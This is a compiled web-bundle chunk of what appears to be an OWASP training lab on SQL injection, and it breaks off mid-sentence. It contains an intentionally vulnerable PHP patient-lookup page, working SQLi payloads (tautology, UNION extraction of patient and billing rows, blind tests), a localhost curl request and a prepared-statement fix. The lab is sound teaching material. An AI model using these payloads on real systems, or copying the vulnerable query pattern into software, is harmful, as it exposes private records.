"use strict";(self.webpackChunkowasp_top_10_labs=self.webpackChunkowasp_top_10_labs||[]).push([[425],{7772:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"injection/sql-injection","title":"SQL Injection","description":"Overview","source":"@site/labs/injection/sql-injection.md","sourceDirName":"injection","slug":"/injection/sql-injection","permalink":"/owasp-top-10-labs/labs/injection/sql-injection","draft":false,"unlisted":false,"editUrl":"https://github.com/mehdiaitsaid/owasp-top-10-labs/blob/master/labs/injection/sql-injection.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"SQL Injection","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"Cryptographic Failures","permalink":"/owasp-top-10-labs/labs/cryptographic-failures"},"next":{"title":"XSS","permalink":"/owasp-top-10-labs/labs/injection/xss"}}');var i=s(4848),l=s(8453);const r={title:"SQL Injection",sidebar_position:1},a="SQL Injection",o={},d=[{value:"What is SQL Injection?",id:"what-is-sql-injection",level:2},{value:"Common SQLi Types",id:"common-sqli-types",level:2},{value:"Typical Consequences",id:"typical-consequences",level:2},{value:"Realistic Use Cases (relevant to this lab)",id:"realistic-use-cases-relevant-to-this-lab",level:2},{value:"Lab scope &amp; structure",id:"lab-scope--structure",level:2},{value:"Detection &amp; Mitigation (high-level)",id:"detection--mitigation-high-level",level:2},{value:"1) Vulnerable PHP page (file: <code>patient_lookup.php</code>)",id:"1-vulnerable-php-page-file-patient_lookupphp",level:2},{value:"2) Why this is vulnerable (brief)",id:"2-why-this-is-vulnerable-brief",level:2},{value:"3) Step-by-step exploitation",id:"3-step-by-step-exploitation",level:2},{value:"Step 0 \u2014 Pre-check",id:"step-0--pre-check",level:3},{value:"Step 1 \u2014 Basic tautology (discover behavior / get many rows)",id:"step-1--basic-tautology-discover-behavior--get-many-rows",level:3},{value:"Step 2 \u2014 Examine server-side SQL (mapping)",id:"step-2--examine-server-side-sql-mapping",level:3},{value:"Step 3 \u2014 Union-based data extraction (in-band SQLi)",id:"step-3--union-based-data-extraction-in-band-sqli",level:3},{value:"Step 4 \u2014 Blind techniques (when errors suppressed)",id:"step-4--blind-techniques-when-errors-suppressed",level:3},{value:"Step 5 \u2014 OOB (Out-of-band) exfiltration (advanced / optional)",id:"step-5--oob-out-of-band-exfiltration-advanced--optional",level:3},{value:"Common pitfalls &amp; hints for students",id:"common-pitfalls--hints-for-students",level:2},{value:"Core security changes (high level)",id:"core-security-changes-high-level",level:2},{value:"What to test after deploying the fixed code",id:"what-to-test-after-deploying-the-fixed-code",level:2},{value:"Lab assumptions &amp; target",id:"lab-assumptions--target",level:2},{value:"1 \u2014 Install sqlmap",id:"1--install-sqlmap",level:2},{value:"Option A \u2014 via <code>pip</code> (portable)",id:"option-a--via-pip-portable",level:3},{value:"Option B \u2014 clone latest from GitHub (recommended for newest features)",id:"option-b--clone-latest-from-github-recommended-for-newest-features",level:3},{value:"2 \u2014 Safe discovery (non-destructive)",id:"2--safe-discovery-non-destructive",level:2},{value:"3 \u2014 Force probing the q parameter",id:"3--force-probing-the-q-parameter",level:2},{value:"4 \u2014 Enumerate databases / users",id:"4--enumerate-databases--users",level:2},{value:"5 \u2014 List tables in hospital_emr",id:"5--list-tables-in-hospital_emr",level:2},{value:"6 \u2014 List columns for a table (example: patients)",id:"6--list-columns-for-a-table-example-patients",level:2},{value:"7 \u2014 Dump table data (targeted extraction)",id:"7--dump-table-data-targeted-extraction",level:2},{value:"8 \u2014 If the site uses POST (form) instead of GET",id:"8--if-the-site-uses-post-form-instead-of-get",level:2},{value:"9 \u2014 Advanced options &amp; practical tips",id:"9--advanced-options--practical-tips",level:2},{value:"10 \u2014 Interpreting sqlmap output",id:"10--interpreting-sqlmap-output",level:2},{value:"11 \u2014 When UNION fails: use blind or time-based options",id:"11--when-union-fails-use-blind-or-time-based-options",level:2},{value:"12 \u2014 Safety, etiquette &amp; cleanup",id:"12--safety-etiquette--cleanup",level:2},{value:"13 \u2014 Verifying fix (post-remediation)",id:"13--verifying-fix-post-remediation",level:2},{value:"Mini Project \u2014 Login Page: Vulnerable &amp; Fixed (Final Instructions)",id:"mini-project--login-page-vulnerable--fixed-final-instructions",level:2},{value:"What students must do (concise)",id:"what-students-must-do-concise",level:3},{value:"Submission (single PDF only)",id:"submission-single-pdf-only",level:3}];function c(e){const n={a:"a",blockquote:"blockquote",br:"br",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"sql-injection",children:"SQL Injection"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Overview"}),(0,i.jsx)(n.br,{}),"\n","SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when an application includes untrusted input in an SQL query without proper validation or parameterization, allowing an attacker to alter the intended SQL command. In a lab context we use controlled vulnerable examples to learn how SQLi works, its impact, and how to prevent it."]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:["\u26a0\ufe0f ",(0,i.jsx)(n.strong,{children:"Important:"})," This lab is for educational, legal, and controlled environments only. Do ",(0,i.jsx)(n.strong,{children:"not"})," apply these techniques against systems you do not own or do not have explicit permission to test."]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"what-is-sql-injection",children:"What is SQL Injection?"}),"\n",(0,i.jsx)(n.p,{children:"SQL Injection happens when user-supplied data is treated as part of an SQL statement. Instead of being handled as data, attacker input changes the structure of the SQL query that the database executes. Depending on the vulnerability and the database privileges, an attacker may be able to:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Read sensitive data (exfiltrate)"}),"\n",(0,i.jsx)(n.li,{children:"Bypass authentication"}),"\n",(0,i.jsx)(n.li,{children:"Modify or delete data"}),"\n",(0,i.jsx)(n.li,{children:"Execute administrative operations"}),"\n",(0,i.jsx)(n.li,{children:"Pivot to other systems or escalate privileges"}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"common-sqli-types",children:"Common SQLi Types"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"In-band (Classic)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.em,{children:"Union-based:"})," use ",(0,i.jsx)(n.code,{children:"UNION SELECT"})," to append attacker-controlled result sets to the application\u2019s results."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.em,{children:"Error-based:"})," provoke database errors that leak information (column names, data types, query structure)."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Blind SQLi"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.em,{children:"Boolean-based:"})," infer data by observing true/false responses from the application."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.em,{children:"Time-based:"})," infer data by causing the database to delay responses conditionally (e.g., ",(0,i.jsx)(n.code,{children:"SLEEP()"}),")."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Out-of-band (OOB)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Use database features that make the DB server connect out to an attacker-controlled service (useful when direct responses are limited)."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"typical-consequences",children:"Typical Consequences"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Data disclosure / exfiltration:"})," Steal sensitive records (PHI, financial records, credentials)."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Authentication bypass:"})," Log in as other users without knowing their password."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Data tampering:"})," Modify or delete records (medical data, billing)."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Privilege escalation:"})," Execute admin-level commands or access restricted features."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Denial of Service (DoS):"})," Run expensive or blocking queries that exhaust DB resources."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reconnaissance & pivoting:"})," Discover schema, tables, and columns to plan further attacks or lateral movement."]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"realistic-use-cases-relevant-to-this-lab",children:"Realistic Use Cases (relevant to this lab)"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Data disclosure / exfiltration (PHI & billing)"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Attacker extracts patient records and billing details from ",(0,i.jsx)(n.code,{children:"patients"})," and ",(0,i.jsx)(n.code,{children:"billing"})," tables. Consequences include privacy breach, regulatory fines (HIPAA / GDPR), and reputational damage."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Authentication bypass"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Manipulate login queries to bypass credential checks (e.g., ",(0,i.jsx)(n.code,{children:"OR '1'='1'"}),") and assume other users\u2019 identities."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Data modification / sabotage"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Change or delete clinical notes, lab results, or billing records to disrupt care or cover tracks."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Reconnaissance for further exploitation"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Enumerate table and column names, data types, and relationships to plan targeted exfiltration or escalation."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Out-of-band exfiltration"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"When direct query responses are filtered, use OOB channels (e.g., DNS or HTTP callbacks) to leak data."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"lab-scope--structure",children:"Lab scope & structure"}),"\n",(0,i.jsxs)(n.p,{children:["This lab is organized in ",(0,i.jsx)(n.strong,{children:"three parts"})," so students can learn step-by-step:"]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Vulnerable code"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Inspect an intentionally vulnerable PHP page that constructs SQL queries by concatenating user input. You will see how input maps to SQL and how easy it is to manipulate."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Secure solution"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Replace the vulnerable code with a safe implementation using parameterized queries (prepared statements), input handling, least-privilege DB accounts, and safer error handling."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Introduction to sqlmap"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Learn how to use ",(0,i.jsx)(n.code,{children:"sqlmap"})," (an automated SQLi tool) responsibly to detect and demonstrate SQLi vectors in a controlled lab. We will use ",(0,i.jsx)(n.code,{children:"sqlmap"})," to enumerate tables, extract sample rows, and compare what ",(0,i.jsx)(n.code,{children:"sqlmap"})," can automate vs. manual exploitation techniques."]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Note:"})," The database schema and initial sample data used by this lab are described on the ",(0,i.jsx)(n.strong,{children:"Setup"})," page. Please make sure the environment is deployed exactly as shown on the Setup page before performing any exploitation steps."]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"detection--mitigation-high-level",children:"Detection & Mitigation (high-level)"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Detection indicators"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Unusual or large SELECT queries from a single account or IP"}),"\n",(0,i.jsx)(n.li,{children:"Repeated malformed queries or database errors in logs"}),"\n",(0,i.jsx)(n.li,{children:"Rapid increases in exported/returned rows or bandwidth"}),"\n",(0,i.jsxs)(n.li,{children:["WAF/DB monitoring alerts for suspicious patterns (e.g., ",(0,i.jsx)(n.code,{children:"%UNION%"}),", ",(0,i.jsx)(n.code,{children:"SLEEP"}),", repeated quotes)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Mitigation checklist"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Use parameterized queries / prepared statements everywhere"}),"\n",(0,i.jsx)(n.li,{children:"Validate and whitelist input where possible (deny-by-default)"}),"\n",(0,i.jsx)(n.li,{children:"Use least-privilege database accounts (limit SELECT columns)"}),"\n",(0,i.jsx)(n.li,{children:"Disable verbose DB error output to clients; log safely and redact PHI"}),"\n",(0,i.jsx)(n.li,{children:"Implement DB activity monitoring and anomaly detection"}),"\n",(0,i.jsx)(n.li,{children:"Apply a WAF as an additional layer (but don\u2019t rely on it as sole protection)"}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h1,{id:"vulnerable-code--patient-lookup-insecure",children:"Vulnerable Code \u2014 Patient Lookup (Insecure)"}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsxs)(n.h2,{id:"1-vulnerable-php-page-file-patient_lookupphp",children:["1) Vulnerable PHP page (file: ",(0,i.jsx)(n.code,{children:"patient_lookup.php"}),")"]}),"\n",(0,i.jsxs)(n.p,{children:["Save the following file in your web root (e.g., ",(0,i.jsx)(n.code,{children:"/src/patient_lookup.php"}),"):"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\n// patient_lookup.php\n// Vulnerable demo for educational SQL Injection lab (Data disclosure)\n\n// DB connection config - adjust to your environment\n$DB_HOST = 'hostname';\n$DB_USER = 'username';\n$DB_PASS = 'password';         // set your password\n$DB_NAME = 'dbname';\n$DB_PORT = 3306;\n\n// Connect (mysqli, procedural)\n$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);\nif (!$conn) {\n    die(\"DB connection error.\");\n}\n\n// Get query parameter\n$q = isset($_GET['q']) ? $_GET['q'] : '';\n\n// --- Vulnerable SQL (UNSAFE) ---\n$sql = \"SELECT id, medical_record_number, first_name, last_name, dob, email FROM patients WHERE first_name LIKE '%$q%' OR last_name LIKE '%$q%' LIMIT 100;\";\n\n// Execute and show results\n$result = mysqli_query($conn, $sql);\n\n?>\n<!doctype html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <title>Patient Lookup (Vulnerable)</title>\n  <style>\n    body { font-family: Arial, sans-serif; padding: 20px; background:#f7f7f9; color:#222; }\n    .card { background: white; border-radius:8px; padding:16px; box-shadow:0 2px 6px rgba(0,0,0,.08); max-width:900px; margin:auto; }\n    table { width:100%; border-collapse: collapse; }\n    th,td { padding:8px; border-bottom:1px solid #eee; text-align:left; }\n    input[type=\"text\"]{ padding:8px; width:60%; margin-right:8px; }\n    button{ padding:8px 12px; }\n    .danger{ color:#8b0000; font-weight:bold; }\n  </style>\n</head>\n<body>\n  <div class=\"card\">\n    <h2>Patient Lookup (VULNERABLE)</h2>\n    <p class=\"danger\">This page is intentionally vulnerable \u2014 for lab use only.</p>\n\n    <form method=\"get\" action=\"/patient_lookup.php\">\n      <input type=\"text\" name=\"q\" placeholder=\"Enter patient first/last name (e.g. John)\" value=\"<?php echo htmlspecialchars($q); ?>\" />\n      <button type=\"submit\">Search</button>\n    </form>\n\n    <hr/>\n\n    <h3>Results</h3>\n\n    <?php if ($result === false): ?>\n      <div style=\"color: red;\">Query error: <?php echo htmlspecialchars(mysqli_error($conn)); ?></div>\n    <?php else: ?>\n      <table>\n        <thead>\n          <tr>\n            <th>#</th><th>MRN</th><th>First Name</th><th>Last Name</th><th>DOB</th><th>Email</th>\n          </tr>\n        </thead>\n        <tbody>\n          <?php while ($row = mysqli_fetch_assoc($result)): ?>\n            <tr>\n              <td><?php echo htmlspecialchars($row['id']); ?></td>\n              <td><?php echo htmlspecialchars($row['medical_record_number']); ?></td>\n              <td><?php echo htmlspecialchars($row['first_name']); ?></td>\n              <td><?php echo htmlspecialchars($row['last_name']); ?></td>\n              <td><?php echo htmlspecialchars($row['dob']); ?></td>\n              <td><?php echo htmlspecialchars($row['email']); ?></td>\n            </tr>\n          <?php endwhile; ?>\n        </tbody>\n      </table>\n    <?php endif; ?>\n\n    <p style=\"margin-top:16px; font-size:0.9em; color:#555;\">\n      Note: the SQL query shown on the server is: <code><?php echo htmlspecialchars($sql); ?></code>\n    </p>\n\n  </div>\n</body>\n</html>\n<?php\nmysqli_close($conn);\n"})}),"\n",(0,i.jsx)(n.h2,{id:"2-why-this-is-vulnerable-brief",children:"2) Why this is vulnerable (brief)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"The script builds an SQL string by directly inserting the q parameter into the query (WHERE first_name LIKE '%$q%' ...)."}),"\n",(0,i.jsx)(n.li,{children:"An attacker can inject characters (quotes, SQL keywords) that change the structure of the query."}),"\n",(0,i.jsx)(n.li,{children:"Because the application echoes the constructed SQL (debug), students can clearly see how payloads map to the executed query \u2014 useful for learning."}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"3-step-by-step-exploitation",children:"3) Step-by-step exploitation"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"Perform these steps only in the lab environment described in Setup."}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"step-0--pre-check",children:"Step 0 \u2014 Pre-check"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Ensure hospital_emr has sample data (patients & billing) inserted."}),"\n",(0,i.jsxs)(n.li,{children:["Visit vulnerable page, e.g.:\n",(0,i.jsx)(n.a,{href:"http://127.0.0.1:8080/patient_lookup.php?q=John",children:"http://127.0.0.1:8080/patient_lookup.php?q=John"}),"\nYou should see only matching rows for John."]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"step-1--basic-tautology-discover-behavior--get-many-rows",children:"Step 1 \u2014 Basic tautology (discover behavior / get many rows)"}),"\n",(0,i.jsx)(n.p,{children:"Payload (in the search box):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"' OR '1'='1\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"What to do:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Enter the payload and submit."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Expected effect:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"The WHERE clause becomes effectively always true \u2192 many or all patient rows are returned (limited by LIMIT 100)."}),"\n",(0,i.jsx)(n.li,{children:"Useful to show how simple input can bypass intended filters."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Why it works (example):\nThe query becomes (conceptually):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"... WHERE first_name LIKE '%' OR '1'='1'%' OR last_name LIKE '%' OR '1'='1'%'\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"This results in a tautology, returning many rows."}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"step-2--examine-server-side-sql-mapping",children:"Step 2 \u2014 Examine server-side SQL (mapping)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Look at the Debug: the SQL executed... block printed on the page."}),"\n",(0,i.jsx)(n.li,{children:"Observe how your input was interpolated \u2014 this helps craft subsequent payloads."}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"step-3--union-based-data-extraction-in-band-sqli",children:"Step 3 \u2014 Union-based data extraction (in-band SQLi)"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Goal:"})," extract additional rows/columns (e.g., billing, other tables)."]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Important:"})," The vulnerable query returns 6 columns (id, medical_record_number, first_name, last_name, dob, email). Any UNION SELECT must return the same number of columns and compatible types (or use fillers)."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Example payload (search box):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' UNION SELECT 1, medical_record_number, first_name, last_name, dob, email FROM patients -- \n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Notes:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"The leading single quote closes the literal; UNION SELECT ... appends rows."}),"\n",(0,i.jsx)(n.li,{children:"-- comments out the rest of the original query."}),"\n",(0,i.jsx)(n.li,{children:"If the page displays rows from patients, the UNION succeeded."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Extracting billing info (map billing columns into the 6 display columns):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' UNION SELECT id, CONCAT('BILL#',id), amount, currency, status, description FROM billing -- \n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Result:"})," Billing rows appear in the patients table display \u2014 demonstrating exfiltration to a UI that wasn't intended to show billing."]}),"\n",(0,i.jsx)(n.h3,{id:"step-4--blind-techniques-when-errors-suppressed",children:"Step 4 \u2014 Blind techniques (when errors suppressed)"}),"\n",(0,i.jsx)(n.p,{children:"If the app does not reveal SQL errors or you cannot use UNION, use blind methods:"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Boolean-based example:"})," check whether first letter of database version is '5'"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' AND (SELECT SUBSTRING(VERSION(),1,1))='5' --\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Observe whether response changes (true/false) to infer values character by character."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Time-based example (MySQL):"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"If the response is delayed, the tested condition is true."}),"\n"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"Blind techniques are slower but powerful when output is limited."}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"step-5--oob-out-of-band-exfiltration-advanced--optional",children:"Step 5 \u2014 OOB (Out-of-band) exfiltration (advanced / optional)"}),"\n",(0,i.jsx)(n.p,{children:"If direct responses are blocked but the database can make network calls (rare in default MySQL), use features (e.g., LOAD_FILE, OUTFILE, or DB-specific UDFs) or cause DNS/HTTP callbacks to an attacker-controlled server. Do not perform network exfiltration on shared lab networks. This is only for advanced/simulated labs."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",metastring:"request",children:'curl "http://127.0.0.1:8080/patient_lookup.php?q=%27+UNION+SELECT+1%2C+medical_record_number%2C+first_name%2C+last_name%2C+dob%2C+email+FROM+patients+--+"\n'})}),"\n",(0,i.jsx)(n.h2,{id:"common-pitfalls--hints-for-students",children:"Common pitfalls & hints for students"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Column count mismatch: If your UNION SELECT has the wrong number of columns, DB returns an error. Use ORDER BY n or trial NULL fillers (e.g., NULL, NULL) to find correct count."}),"\n",(0,i.jsx)(n.li,{children:"Data types: If a column expects number but you provide text, use type-compatible values (e.g., use 1 for numeric id columns or wrap strings in quotes)."}),"\n",(0,i.jsx)(n.li,{children:"LIMIT hiding data: LIMIT 100 can hide rows; attack may need multiple queries or remove LIMIT via comment injection if possible."}),"\n",(0,i.jsx)(n.li,{children:"Escaped characters / filters: If the app escapes quotes or filters keywords, try alternative encodings or blind/time-based techniques."}),"\n",(0,i.jsx)(n.li,{children:"WAFs / detection: Basic WAFs may block naive payloads \u2014 teach how WAFs raise alerts and also how attackers try to evade them (but emphasize defenders should tune WAFs and monitoring)."}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"secure-implementation--patient-lookup-fixed",children:"Secure Implementation \u2014 Patient Lookup (Fixed)"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"File:"})," ",(0,i.jsx)(n.code,{children:"patient_lookup_fixed.php"}),(0,i.jsx)(n.br,{}),"\n","The file above is the fixed now you have to test the differences."]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\n// patient_lookup_fixed.php - safe version using prepared statements\n\n$DB_HOST = 'hostname';\n$DB_USER = 'username';\n$DB_PASS = 'password';         // set your password\n$DB_NAME = 'dbname';\n$DB_PORT = 3306;\n\n$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);\nif (!$conn) die(\"DB connection error.\");\n\n$q = isset($_GET['q']) ? trim($_GET['q']) : '';\n\n// Use prepared statement and bind parameter\n$sql = \"SELECT id, medical_record_number, first_name, last_name, dob, email\n        FROM patients\n        WHERE first_name LIKE CONCAT('%', ?, '%') OR last_name LIKE CONCAT('%', ?, '%')\n        LIMIT 100\";\n\n$stmt = mysqli_prepare($conn, $sql);\nif ($stmt) {\n    mysqli_stmt_bind_param($stmt, \"ss\", $q, $q);\n    mysqli_stmt_execute($stmt);\n    $res = mysqli_stmt_get_result($stmt);\n} else {\n    die(\"Prepare failed.\");\n}\n?>\n<!doctype html><html><head><meta charset=\"utf-8\"><title>Patient Lookup (Fixed)</title></head>\n<body>\n  <h2>Patient Lookup (FIXED)</h2>\n  <form><input name=\"q\" value=\"<?php echo htmlspecialchars($q); ?>\" /><button>Search</button></form>\n  <table border=\"1\">\n    <tr><th>#</th><th>MRN</th><th>First</th><th>Last</th><th>DOB</th><th>Email</th></tr>\n    <?php while ($row = mysqli_fetch_assoc($res)): ?>\n      <tr>\n        <td><?php echo htmlspecialchars($row['id']); ?></td>\n        <td><?php echo htmlspecialchars($row['medical_record_number']); ?></td>\n        <td><?php echo htmlspecialchars($row['first_name']); ?></td>\n        <td><?php echo htmlspecialchars($row['last_name']); ?></td>\n        <td><?php echo htmlspecialchars($row['dob']); ?></td>\n        <td><?php echo htmlspecialchars($row['email']); ?></td>\n      </tr>\n    <?php endwhile; ?>\n  </table>\n</body></html>\n<?php mysqli_close($conn); ?>\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"core-security-changes-high-level",children:"Core security changes (high level)"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Use of Prepared Statements / Parameterized Queries"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["The fixed implementation uses prepared statements (e.g., ",(0,i.jsx)(n.code,{children:"mysqli_prepare()"})," / ",(0,i.jsx)(n.code,{children:"PDO::prepare()"}),"), binding user input as parameters instead of concatenating it into the SQL string."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Bound parameters are treated strictly as data \u2014 they cannot change the SQL syntax \u2014 which eliminates SQL Injection vectors."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsxs)(n.strong,{children:["Safer ",(0,i.jsx)(n.code,{children:"LIKE"})," usage with parameters"]})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Instead of building ",(0,i.jsx)(n.code,{children:"'%$q%'"})," directly into SQL, the implementation uses 